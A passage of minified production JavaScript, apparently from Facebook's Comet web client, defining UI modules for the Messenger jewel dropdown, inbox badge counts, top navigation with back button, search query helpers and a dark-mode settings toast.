        var b = c("gkx")("2530"),
          e = m(0),
          f = e[0],
          g = e[1],
          i = l(null);
        e = k(
          function (a) {
            g && g(a);
            if (i.current === a) return;
            i.current = a;
          },
          [g]
        );
        var o = d("CometRelay").useRelayEnvironment(),
          p = k(
            function () {
              o.commitUpdate(function (a) {
                var b = a.getRoot();
                if (b == null) {
                  c("recoverableViolation")(
                    "A store root must be present to move forward.",
                    "messenger_comet"
                  );
                  return;
                }
                b = b.getLinkedRecord("viewer");
                if (b == null) {
                  c("recoverableViolation")(
                    "A viewer record does not exist.",
                    "messenger_comet"
                  );
                  return;
                }
                var d = b.getLinkedRecord("message_threads");
                if (d == null) {
                  var e = "client:root:viewer:message_threads";
                  d = a.create(e, "ViewerMessageThreadsConnection");
                  b.setLinkedRecord(d, "message_threads");
                }
                d.setValue(0, "unseen_count");
              });
            },
            [o]
          );
        f =
          f === 0
            ? h._("__JHASH__lpjUQ8yq6fh__JHASH__")
            : h._("__JHASH__ScBkJbM4noF__JHASH__", [h._param("badge count", f)]);
        return j.jsx(c("CometProfilePlusAPPageInboxMessageButtonImpl.react"), {
          deferredBadgeCount: b ? n : null,
          label: f,
          linkProps: { target: "_blank", url: a },
          onPress: b ? p : void 0,
          setBadgeCount: e,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometTopNavLogoWithBackButton.react",
    [
      "fbt",
      "ix",
      "CometCircleButton.react",
      "CometLoggedInFacebookLogo.react",
      "CometTooltip.react",
      "Locale",
      "fbicon",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k,
        l = k || d("react"),
        m = d("Locale").isRTL(),
        n = 40,
        o = {
          backButton: {
            opacity: "x1hc1fzr",
            position: "x10l6tqk",
            start: "x10ja8i0",
            left: null,
            right: null,
            transform: "xcd74o5",
            transitionDuration: "x1k90msu",
            transitionProperty: "x6o7n8i",
            transitionTimingFunction: "xbxq160",
            $$css: !0,
          },
          backButtonHidden: {
            opacity: "xg01cxk",
            pointerEvents: "x47corl",
            $$css: !0,
          },
          backButtonVisibleLTR: { transform: "xtzu7as", $$css: !0 },
          backButtonVisibleRTL: { transform: "x61iya9", $$css: !0 },
          logo: {
            opacity: "x1hc1fzr",
            transitionDuration: "x1k90msu",
            transitionProperty: "x6o7n8i",
            transitionTimingFunction: "xbxq160",
            $$css: !0,
          },
          logoHidden: { opacity: "xg01cxk", pointerEvents: "x47corl", $$css: !0 },
          logoWithBackButtonLTR: { transform: "xtzu7as", $$css: !0 },
          logoWithBackButtonRTL: { transform: "x61iya9", $$css: !0 },
        };
      function p(a) {
        a = a.children;
        return l.jsx(c("CometTooltip.react"), {
          position: "below",
          tooltip: h._("__JHASH__mq0TtI3_EPy__JHASH__"),
          children: a,
        });
      }
      p.displayName = p.name + " [from " + f.id + "]";
      function q(a) {
        a = a.children;
        return a;
      }
      function a(a) {
        var b = a.logoHidden;
        b = b === void 0 ? !1 : b;
        var e = a.logoWithShadow;
        e = e === void 0 ? !1 : e;
        var f = a.onPressBackButton,
          g = a.shouldUseCloseButton;
        g = g === void 0 ? !1 : g;
        a = a.showBackButton;
        a = a === void 0 ? !1 : a;
        var k = g ? p : q;
        return l.jsxs(l.Fragment, {
          children: [
            l.jsx("div", {
              className: (j || (j = c("stylex")))([
                o.backButton,
                a
                  ? m
                    ? o.backButtonVisibleRTL
                    : o.backButtonVisibleLTR
                  : o.backButtonHidden,
              ]),
              children: l.jsx(k, {
                children: l.jsx(c("CometCircleButton.react"), {
                  "aria-hidden": !a,
                  color: g ? "white" : "primary",
                  disabled: !a,
                  icon: g
                    ? d("fbicon")._(i("478233"), 20)
                    : m
                    ? d("fbicon")._(i("514454"), 20)
                    : d("fbicon")._(i("512647"), 20),
                  label: g
                    ? h._("__JHASH__a_qj__uOTBG__JHASH__")
                    : h._("__JHASH__PS-q9pFoZzf__JHASH__"),
                  onPress: f,
                  size: n,
                  testid: void 0,
                  type: g ? "dark-overlay" : void 0,
                }),
              }),
            }),
            l.jsx(c("CometLoggedInFacebookLogo.react"), {
              "aria-hidden": b,
              withShadow: e,
              xstyle: [
                o.logo,
                b && o.logoHidden,
                a && (m ? o.logoWithBackButtonRTL : o.logoWithBackButtonLTR),
              ],
            }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometMessagingJewelDropdown.entrypoint",
    [
      "CometMessagingJewelDropdownQuery$Parameters",
      "JSResourceForInteraction",
      "gkx",
      "qex",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h =
        c("gkx")("7350") ||
        ((a = c("qex")._("352")) != null ? a : !1) ||
        ((b = c("qex")._("362")) != null ? b : !1) ||
        ((d = c("qex")._("371")) != null ? d : !1) ||
        ((e = c("qex")._("408")) != null ? e : !1) ||
        ((f = c("qex")._("411")) != null ? f : !1);
      a = {
        getPreloadProps: function () {
          return {
            queries: {
              jewelQueryRef: {
                parameters: c("CometMessagingJewelDropdownQuery$Parameters"),
                variables: { isEBEnabled: h },
              },
            },
          };
        },
        root: c("JSResourceForInteraction")(
          "CometMessagingJewelDropdown.react"
        ).__setRef("CometMessagingJewelDropdown.entrypoint"),
      };
      g["default"] = a;
    },
    98
  );
  __d(
    "CometMessagingJewelDropdownClassicEntrypoint",
    ["CometMessagingJewelDropdown.entrypoint", "requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("requireDeferred")("CometMessagingJewelDropdown.react").__setRef(
        "CometMessagingJewelDropdownClassicEntrypoint"
      );
      g.DeferredRoot = a;
      g.Entrypoint = c("CometMessagingJewelDropdown.entrypoint");
    },
    98
  );
  __d(
    "CometSettingsBadgedDropdownTriggerMWJewelDropdownEntrypoint.react",
    [
      "CometMessagingJewelDropdownClassicEntrypoint",
      "CometSettingsBadgedDropdownTrigger.react",
      "MWJewelPopoverDialogContext.react",
      "MessageRequestsBulkActionsContext.react",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext;
      d(
        "CometMessagingJewelDropdownClassicEntrypoint"
      ).DeferredRoot.getModuleId();
      function a(a) {
        var b = j(c("MessageRequestsBulkActionsContext.react"));
        b = b.isBulkActionsEditMode;
        var e = j(c("MWJewelPopoverDialogContext.react"));
        e = e.isOpenForDialog;
        return i.jsx(
          c("CometSettingsBadgedDropdownTrigger.react"),
          babelHelpers["extends"]({}, a, {
            doNotCloseOnOutsideClick: e || b,
            dropdownEntryPoint: d("CometMessagingJewelDropdownClassicEntrypoint")
              .Entrypoint,
            preloadTrigger: "tooltip",
          })
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MWCMJewelContextProvider.react",
    ["LSIntEnum", "MWCMJewelContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = h || (h = d("react"));
      b = h;
      var k = b.useMemo,
        l = b.useState;
      function a(a) {
        a = a.children;
        var b = l(function () {
            return (i || (i = d("LSIntEnum"))).ofNumber(0);
          }),
          e = b[0],
          f = b[1];
        b = k(
          function () {
            return { selectedFolderTab: e, setSelectedFolderTab: f };
          },
          [e]
        );
        return j.jsx(c("MWCMJewelContext").Provider, { value: b, children: a });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MWJewelExperimentationContext.react",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = (h || d("react")).createContext;
      b = a({ bannerWasSeen: !1, onBannerVisible: function () {} });
      g["default"] = b;
    },
    98
  );
  __d(
    "MWJewelPopoverDialogContextProvider.react",
    ["MWJewelPopoverDialogContext.react", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useMemo,
        k = b.useState;
      function a(a) {
        a = a.children;
        var b = k(!1),
          d = b[0],
          e = b[1];
        b = j(
          function () {
            return { isOpenForDialog: d, setIsOpenForDialog: e };
          },
          [d]
        );
        return i.jsx(c("MWJewelPopoverDialogContext.react").Provider, {
          value: b,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MWJewelPopoverThreadlistContext.react",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = (h || d("react")).createContext;
      b = a();
      g["default"] = b;
    },
    98
  );
  __d(
    "MWJewelThreadlistPreloaderDeferred",
    ["requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("requireDeferred")("MWJewelThreadlistPreloader").__setRef(
        "MWJewelThreadlistPreloaderDeferred"
      );
      a.getModuleId();
      b = a;
      g["default"] = b;
    },
    98
  );
  __d(
    "MessageRequestsBulkActionsContextProvider.react",
    ["MessageRequestsBulkActionsContext.react", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useEffect,
        k = b.useMemo,
        l = b.useState;
      function a(a) {
        a = a.children;
        var b = l(!1),
          d = b[0],
          e = b[1];
        b = l(new Set());
        var f = b[0],
          g = b[1];
        b = l(new Set());
        var h = b[0],
          m = b[1];
        j(
          function () {
            g(function () {
              return new Set();
            }),
              m(function () {
                return new Set();
              });
          },
          [d, g, m]
        );
        b = k(
          function () {
            return {
              bulkActionsSelectedThreads: f,
              bulkActionsUnreadSelectedThreads: h,
              isBulkActionsEditMode: d,
              setBulkActionsSelectedThreads: g,
              setBulkActionsUnreadSelectedThreads: m,
              setIsBulkActionsEditMode: e,
            };
          },
          [f, d, h]
        );
        return i.jsx(c("MessageRequestsBulkActionsContext.react").Provider, {
          value: b,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "MWJewelDropdownTrigger.react",
    [
      "fbt",
      "CometIconMessengerFilled.react",
      "CometSettingsBadgedDropdownTriggerMWJewelDropdownEntrypoint.react",
      "CometSettingsListDropdownLoadingState.react",
      "I64",
      "InteractionTracing",
      "JSResourceForInteraction",
      "JSScheduler",
      "MWCMJewelContextProvider.react",
      "MWJewelEntrypoint",
      "MWJewelExperimentationContext.react",
      "MWJewelPopoverDialogContextProvider.react",
      "MWJewelPopoverThreadlistContext.react",
      "MWJewelThreadlistPreloaderDeferred",
      "MessageRequestsBulkActionsContextProvider.react",
      "MultipleTabsLogger",
      "SVGIcon",
      "cr:7045",
      "cr:7230",
      "cr:7485",
      "cr:7630",
      "cr:7632",
      "cr:7634",
      "cr:7636",
      "cr:7638",
      "cr:7642",
      "cr:7644",
      "cr:7646",
      "cr:7648",
      "cr:7650",
      "deferredLoadComponent",
      "gkx",
      "justknobx",
      "promiseDone",
      "qpl",
      "react",
      "requireDeferredForDisplay",
      "useTopNavigationLogging",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k,
        l = i || (i = d("react"));
      e = i;
      var m = e.useCallback,
        n = e.useMemo,
        o = e.useRef,
        p = e.useState,
        q =
          (e =
            (e =
              (e = (e = b("cr:7630")) != null ? e : b("cr:7632")) != null
                ? e
                : b("cr:7634")) != null
              ? e
              : b("cr:7636")) != null
            ? e
            : b("cr:7638"),
        r =
          (e =
            (e =
              (e =
                (e = (e = b("cr:7485")) != null ? e : b("cr:7642")) != null
                  ? e
                  : b("cr:7644")) != null
                ? e
                : b("cr:7646")) != null
              ? e
              : b("cr:7648")) != null
            ? e
            : b("cr:7650");
      c("MWJewelThreadlistPreloaderDeferred").getModuleId();
      var s = c("JSResourceForInteraction")(
          "MWJewelThreadlistPreloader"
        ).__setRef("MWJewelDropdownTrigger.react"),
        t = c("JSResourceForInteraction")("GetLsDatabase").__setRef(
          "MWJewelDropdownTrigger.react"
        ),
        u = c("deferredLoadComponent")(
          c("requireDeferredForDisplay")("MWChatBadgeCount.react").__setRef(
            "MWJewelDropdownTrigger.react"
          )
        );
      function v(a) {
        a = a.children;
        return b("cr:7045") != null
          ? l.jsx(b("cr:7045"), { useChatTab: !0, children: a })
          : a;
      }
      v.displayName = v.name + " [from " + f.id + "]";
      var w = c("JSResourceForInteraction")("MWV2ChatTab.react").__setRef(
          "MWJewelDropdownTrigger.react"
        ),
        x = function (a) {
          var d = a.requiresEbOnboarding;
          a = a.requiresEbRestore;
          if (
            b("cr:7230") != null &&
            a &&
            c("MWJewelEntrypoint").entrypoint === "RESTORE"
          )
            return b("cr:7230");
          else if (
            q != null &&
            d &&
            c("MWJewelEntrypoint").entrypoint === "ONBOARDING_SOFTBLOCK"
          )
            return q;
          return c(
            "CometSettingsBadgedDropdownTriggerMWJewelDropdownEntrypoint.react"
          );
        };
      function a(a) {
        var b, e;
        a = a.dropdownPosition;
        a = a === void 0 ? "below" : a;
        var f = r == null ? void 0 : r(c("MWJewelEntrypoint").entrypoint);
        b = (b = f == null ? void 0 : f.requiresEbRestore) != null ? b : !1;
        e = (e = f == null ? void 0 : f.requiresEbOnboarding) != null ? e : !1;
        e = x({ requiresEbOnboarding: e, requiresEbRestore: b });
        b = p(0);
        var g = b[0];
        b = b[1];
        var i = d("useTopNavigationLogging").useMessengerButtonLoggingCallbacks(
            g.toString()
          ),
          q = i[0];
        i = i[1];
        var y = o(!1),
          z = m(function (a) {
            y.current ||
              ((y.current = !0),
              c("gkx")("636") &&
                c("promiseDone")(
                  t.load().then(function (a) {
                    return a.get();
                  })
                ),
              c("promiseDone")(
                s.load().then(function (a) {
                  return a();
                })
              ));
          }, []),
          A = c("qpl")._(30605361, "6204"),
          B = o(new Set()),
          C = m(
            function () {
              c("InteractionTracing")
                .getPendingInteractions()
                .forEach(function (a) {
                  var b;
                  ((b = a.getTrace()) == null ? void 0 : b.qplEvent) === A &&
                    (a.onComplete(function () {
                      a.addAnnotation("badge_count", g.toString()),
                        a.addAnnotationStringArray(
                          "thread_ids",
                          Array.from(B.current).map(function (a) {
                            return (j || (j = d("I64"))).to_string(a);
                          })
                        );
                    }),
                    d("MultipleTabsLogger").addAnnotationWithInteractionUuid(
                      a.getTraceId()
                    ),
                    a.addAnnotationBoolean(
                      "isArmadilloPublicLaunchUser",
                      c("gkx")("688")
                    ));
                });
            },
            [g, A, B]
          ),
          D = m(
            function () {
              f == null ? void 0 : f.onJewelPress(),
                c("justknobx")._("761") &&
                  (k || (k = d("JSScheduler"))).scheduleSpeculativeCallback(
                    function () {
                      w.preload();
                    }
                  ),
                q(),
                C();
            },
            [f, C, q]
          ),
          E = p(!1),
          F = E[0],
          G = E[1];
        E =
          g === 0
            ? h._("__JHASH__ptC-BqtItMK__JHASH__")
            : h._("__JHASH__zF_9yg3mRYI__JHASH__", [h._param("badge count", g)]);
        var H = n(
            function () {
              return {
                bannerWasSeen: F,
                onBannerVisible: function () {
                  return G(!0);
                },
              };
            },
            [F, G]
          ),
          I = l.jsx(c("CometSettingsListDropdownLoadingState.react"), {
            hasActions: !0,
            title: h._("__JHASH__9FTPnWJWCay__JHASH__"),
          });
        H = l.jsx(c("MWJewelPopoverDialogContextProvider.react"), {
          children: l.jsx(c("MessageRequestsBulkActionsContextProvider.react"), {
            children: l.jsx(c("MWJewelExperimentationContext.react").Provider, {
              value: H,
              children: l.jsx(
                c("MWJewelPopoverThreadlistContext.react").Provider,
                {
                  value: B.current,
                  children: l.jsx(v, {
                    children: l.jsx(e, {
                      badgeCount: g,
                      deferredBadgeCount: u,
                      dropdownPosition: a,
                      fallback: I,
                      icon: d("SVGIcon").legacySVGIcon(
                        c("CometIconMessengerFilled.react")
                      ),
                      label: E,
                      loggingRef: i,
                      onBadgeCount: b,
                      onHoverInPrerenderer: z,
                      onPress: D,
                      onPressInPrerenderer: z,
                      testid: void 0,
                      tooltipLabel: h._("__JHASH__o5k_4FKzATU__JHASH__"),
                      tracePolicy: "comet.jewel.messenger",
                    }),
                  }),
                }
              ),
            }),
          }),
        });
        return l.jsx(c("MWCMJewelContextProvider.react"), { children: H });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "getSearchCometResultsQuery",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a, b) {
        var c = b.hashtag;
        if (typeof c === "string") return "#" + c;
        c = b.q;
        if (typeof c === "string") return c;
        b = a.decrypted_bqf_title;
        return typeof b === "string" ? b : null;
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "SearchCometExploreTracePolicy",
    [],
    function (a, b, c, d, e, f) {
      a = Object.freeze({
        HASHTAG: "comet.search_explore.hashtag",
        TOPIC: "comet.search_explore.topic",
      });
      f["default"] = a;
    },
    66
  );
  __d(
    "isSearchCometExploreTracePolicy",
    ["SearchCometExploreTracePolicy"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        return Object.values(c("SearchCometExploreTracePolicy")).includes(a);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getSearchQueryFromRouterState",
    [
      "getSearchCometResultsQuery",
      "getTopMostRouteInfo",
      "isSearchCometExploreTracePolicy",
      "isSearchCometGlobalResultPageTracePolicy",
      "isSearchCometScopedResultPageTracePolicy",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        a = c("getTopMostRouteInfo")(a);
        var b = a.route.tracePolicy;
        return b == null ||
          (!c("isSearchCometGlobalResultPageTracePolicy")(b) &&
            !c("isSearchCometScopedResultPageTracePolicy")(b) &&
            !c("isSearchCometExploreTracePolicy")(b))
          ? null
          : c("getSearchCometResultsQuery")(
              a.route.rootView.props,
              a.route.params
            );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getGlobalSearchQueryFromRouterState",
    [
      "getSearchQueryFromRouterState",
      "getTopMostRouteInfo",
      "isSearchCometExploreTracePolicy",
      "isSearchCometGlobalResultPageTracePolicy",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        var b = c("getTopMostRouteInfo")(a);
        b = b.route.tracePolicy;
        return b == null ||
          (!c("isSearchCometGlobalResultPageTracePolicy")(b) &&
            !c("isSearchCometExploreTracePolicy")(b))
          ? null
          : c("getSearchQueryFromRouterState")(a);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometNavigationBackButtonConfig",
    [
      "CometRouterPushViewStackContext",
      "react",
      "useCometRouterDispatcher",
      "usePrevious",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      b = h || d("react");
      var i = b.useCallback,
        j = b.useContext;
      function a() {
        var a = c("useCometRouterDispatcher")(),
          b = i(
            function () {
              a != null && a.goBack();
            },
            [a]
          ),
          d = i(
            function () {
              a != null && a.popPushView();
            },
            [a]
          ),
          e = j(c("CometRouterPushViewStackContext")),
          f = e != null && e.length > 0;
        e = e != null ? e[e.length - 1] : null;
        var g = c("usePrevious")(e);
        f = f;
        g =
          (e =
            e == null
              ? g == null
                ? void 0
                : (g = g.route) == null
                ? void 0
                : g.useCloseButton
              : e == null
              ? void 0
              : (g = e.route) == null
              ? void 0
              : g.useCloseButton) != null
            ? e
            : !1;
        return {
          onPressBackButton: g ? d : b,
          shouldUseCloseButton: g,
          showBackButton: f,
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useSearchCometGlobalTypeaheadShouldShowExpandedOutsideHome",
    ["useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = ["watch", "marketplace", "groups", "gaming"];
      function a() {
        var a = c("useCometRouterState")();
        a = (a == null ? void 0 : a.main.route) || {};
        a = a.tabKey;
        return a !== "home" && !h.includes(a);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useShouldHideTopNavDueToConsentFlow",
    ["CometRouterRouteTopNavTypeContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometRouterRouteTopNavTypeContext"));
        return a === "hide_top_nav_for_consent_flow_only_donotuse";
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppNavigationProfileSwitcherConfig",
    ["CometAppNavigationProfileSwitcherConfigQuery.graphql", "CometRelay", "gkx"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i =
          h !== void 0
            ? h
            : (h = b("CometAppNavigationProfileSwitcherConfigQuery.graphql"));
      function a(a) {
        var b;
        a = d("CometRelay").usePreloadedQuery(i, a);
        var e = c("gkx")("1266082");
        b =
          ((a == null
            ? void 0
            : (b = a.viewer) == null
            ? void 0
            : (b = b.actor) == null
            ? void 0
            : (b = b.profile_switcher_eligible_profiles) == null
            ? void 0
            : b.count) || 0) > 0;
        a =
          a == null
            ? void 0
            : (a = a.viewer) == null
            ? void 0
            : (a = a.actor) == null
            ? void 0
            : (a = a.profile_picture) == null
            ? void 0
            : a.uri;
        return {
          hideProfileNavigationLink: e || b,
          profilePictureUriForSettings: (e = a) != null ? e : null,
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "withAppLoggedInNavigationSwitcher",
    ["CometAppNavigationProfileSwitcherConfig", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        return function (b) {
          b = c("CometAppNavigationProfileSwitcherConfig")(
            b.profileSwitcherConfigQuery
          );
          return i.jsx(a, { profileSwitcherConfig: b });
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppLoggedInNavigation.react",
    [
      "CometAppNavigationEndSection.react",
      "CometAppNavigationEndSectionItem.react",
      "CometAppNavigationTabBarContentWrapper.react",
      "CometBaseAppNavigation.react",
      "CometErrorBoundary.react",
      "CometMediaViewerFullscreenContext",
      "CometProfilePlusAPPageInboxMessageButton.react",
      "CometRouterPushViewStackContext",
      "CometSettingsDropdownTriggerWrapper.react",
      "CometTopNavLogoWithBackButton.react",
      "MWJewelDropdownTrigger.react",
      "ProfilePlusMessaging",
      "cr:12331",
      "cr:1266079",
      "cr:1528736",
      "cr:2026784",
      "cr:2351",
      "getGlobalSearchQueryFromRouterState",
      "getTopMostRoute",
      "gkx",
      "react",
      "unrecoverableViolation",
      "useCometNavigationBackButtonConfig",
      "useCometRouterState",
      "useSearchCometGlobalTypeaheadShouldShowExpandedOutsideHome",
      "useShouldHideTopNavDueToConsentFlow",
      "useShouldRenderFullTopNav",
      "useShouldShowMessagingEntrypointInCometRoot",
      "withAppLoggedInNavigationSwitcher",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      d = h;
      var j = d.useContext,
        k = d.useState,
        l = c("gkx")("1890030"),
        m = (d = c("ProfilePlusMessaging").mailboxID) != null ? d : "",
        n = c("ProfilePlusMessaging").shouldRedirectMessagesForAP && m !== null,
        o = i.memo(a);
      function a() {
        return n
          ? i.jsx(c("CometProfilePlusAPPageInboxMessageButton.react"), {
              mailboxID: m,
            })
          : i.jsx(c("MWJewelDropdownTrigger.react"), {});
      }
      function p(a) {
        a = a.profileSwitcherConfig;
        var d = c("useCometRouterState")();
        if (d == null)
          throw c("unrecoverableViolation")(
            "Cannot render comet app with no route provider",
            "comet_infra"
          );
        var e = k(!1),
          f = e[0],
          g = e[1];
        e = c("useShouldShowMessagingEntrypointInCometRoot")("JEWEL");
        var h = d.main.route.tabKey === "home",
          m = d.main.route.tabKey === "notifications",
          n = c("getTopMostRoute")(d).tabKey === "friends",
          p = j(c("CometMediaViewerFullscreenContext")),
          q = c("useSearchCometGlobalTypeaheadShouldShowExpandedOutsideHome")(),
          r = c("useCometNavigationBackButtonConfig")(),
          s = r.onPressBackButton,
          t = r.shouldUseCloseButton;
        r = r.showBackButton;
        var u = j(c("CometRouterPushViewStackContext"));
        u = u != null && u.length > 0;
        d = (d = c("getGlobalSearchQueryFromRouterState")(d)) != null ? d : "";
        var v = c("useShouldRenderFullTopNav")(),
          w = c("useShouldHideTopNavDueToConsentFlow")(),
          x = function () {
            return g(!0);
          },
          y = function () {
            return g(!1);
          },
          z = null;
        a.hideProfileNavigationLink === !0 &&
          (z = a.profilePictureUriForSettings);
        return w
          ? i.jsx(i.Fragment, {})
          : i.jsx(c("CometBaseAppNavigation.react"), {
              endSection:
                u && p
                  ? void 0
                  : i.jsxs(c("CometAppNavigationEndSection.react"), {
                      children: [
                        i.jsx(c("CometAppNavigationEndSectionItem.react"), {
                          noWrapper: !0,
                          children: i.jsx(c("CometErrorBoundary.react"), {
                            children: i.jsx(
                              c("CometSettingsDropdownTriggerWrapper.react"),
                              { profilePictureUri: z }
                            ),
                          }),
                        }),
                        v && b("cr:1266079") != null
                          ? i.jsx(c("CometAppNavigationEndSectionItem.react"), {
                              children: i.jsx(b("cr:1266079"), {
                                isNotifications: m,
                              }),
                            })
                          : null,
                        e
                          ? i.jsx(c("CometAppNavigationEndSectionItem.react"), {
                              children: i.jsx(o, {}),
                            })
                          : null,
                        v && b("cr:2026784") != null
                          ? i.jsx(c("CometAppNavigationEndSectionItem.react"), {
                              children: i.jsx(b("cr:2026784"), {}),
                            })
                          : null,
                        b("cr:2351") != null && l
                          ? i.jsx(c("CometAppNavigationEndSectionItem.react"), {
                              displayNone: u,
                              widePivotLink: !0,
                              children: i.jsx(b("cr:2351"), { isActive: n }),
                            })
                          : null,
                      ],
                    }),
              searchSection:
                v && b("cr:1528736")
                  ? i.jsx(b("cr:1528736"), {
                      handleCloseSearch: y,
                      handleOpenSearch: x,
                      initialGlobalSearchQuery: d,
                      isHome: h,
                      isSearchOpened: f,
                      shouldHideGlobalTypeahead: u,
                      showGlobalTypeaheadExpandedOutsideHome: q,
                    })
                  : null,
              startButtons: i.jsx(c("CometTopNavLogoWithBackButton.react"), {
                logoHidden: f,
                logoWithShadow: u,
                onPressBackButton: s,
                shouldUseCloseButton: t,
                showBackButton: r,
              }),
              tabBar: i.jsx(c("CometAppNavigationTabBarContentWrapper.react"), {
                inert: u,
                children: i.jsx(b("cr:12331"), {}),
              }),
            });
      }
      p.displayName = p.name + " [from " + f.id + "]";
      var q = c("withAppLoggedInNavigationSwitcher")(p);
      function e(a) {
        a = a.profileSwitcherConfigQuery;
        return a
          ? i.jsx(q, { profileSwitcherConfigQuery: a })
          : i.jsx(p, {
              profileSwitcherConfig: {
                hideProfileNavigationLink: !1,
                profilePictureUriForSettings: null,
              },
            });
      }
      e.displayName = e.name + " [from " + f.id + "]";
      g["default"] = e;
    },
    98
  );
  __d(
    "useCometDarkModeSystemSettingToast",
    [
      "fbt",
      "CometDarkModeContext",
      "ODS",
      "cometPushToast",
      "react",
      "useSystemPrefersDarkMode",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i, j;
      b = i || d("react");
      var k = b.useContext,
        l = b.useEffect,
        m = b.useRef,
        n = 15e3,
        o = "comet.dark_mode_audit";
      function a() {
        var a = k(c("CometDarkModeContext")),
          b = a.currentSetting,
          e = a.setDarkModeSetting,
          f = d("useSystemPrefersDarkMode").useSystemPrefersDarkMode(function () {
            return b;
          }),
          g = m(f);
        l(function () {
          if (f !== g.current) {
            var a = b === "ENABLED";
            b !== "USE_SYSTEM" &&
              a !== f &&
              (d("cometPushToast").cometPushToast(
                {
                  action: {
                    label: h._("__JHASH__JbNKuxJzAoE__JHASH__"),
                    onPress: function () {
                      e("USE_SYSTEM"),
                        (j || (j = d("ODS"))).bumpEntityKey(
                          4929,
                          o,
                          "toast_clicked_cta"
                        );
                    },
                  },
                  message: f
                    ? h._("__JHASH__rPaWkuh_7ix__JHASH__")
                    : h._("__JHASH__nqA-NEnT6zm__JHASH__"),
                },
                n
              ),
              (j || (j = d("ODS"))).bumpEntityKey(4929, o, "toast_pushed"));
            g.current = f;
          }
        });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppWithTopNavContentComponent.react",
    [
      "CometAppContent.react",
      "CometAppLoggedInNavigation.react",
      "CometTransientDialogProvider.react",
      "react",
      "useCometDarkModeSystemSettingToast",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        a = a.profileSwitcherConfigQuery;
        c("useCometDarkModeSystemSettingToast")();
        return i.jsx(c("CometAppContent.react"), {
          appNavigation: i.jsx(c("CometTransientDialogProvider.react"), {
            children: i.jsx(c("CometAppLoggedInNavigation.react"), {
              profileSwitcherConfigQuery: a,
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppContentComponent.react",
    ["CometAppWithTopNavContentComponent.react", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        a = a.profileSwitcherConfigQuery;
        return i.jsx(c("CometAppWithTopNavContentComponent.react"), {
          profileSwitcherConfigQuery: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "DSPDisplayModeContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext(null);
      g["default"] = b;
    },
    98
  );
  __d(
    "makeCometDarkModeStateProvider.react",
    [
      "fbt",
      "BaseThemeConfigContext",
      "BaseThemeDisplayModeContext",
      "CometDarkModeContext",
      "CometDarkModeRootClass",
      "CometStyleXSheet",
      "DSPDisplayModeContext",
      "cometGetKeyCommandConfig",
      "gkx",
      "isRouteTransparent",
      "react",
      "requireDeferredForDisplay",
      "useCometRouterState",
      "useCometSetDarkModeMetaContent",
      "useGlobalKeyCommands",
      "useSystemPrefersDarkMode",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useCallback,
        l = b.useLayoutEffect,
        m = b.useMemo,
        n = b.useState,
